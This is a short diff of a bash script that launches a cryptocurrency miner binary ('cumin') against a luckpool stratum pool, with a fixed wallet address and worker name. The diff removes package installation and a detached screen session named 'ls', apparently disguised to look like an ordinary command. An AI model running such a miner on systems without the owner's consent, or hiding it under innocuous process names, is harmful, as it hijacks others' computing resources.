@@ -1,8 +1,5 @@
 #!/bin/bash
-sudo apt update 
-sudo apt install screen libjansson4 -y 
 chmod +x cumin
-screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=prox
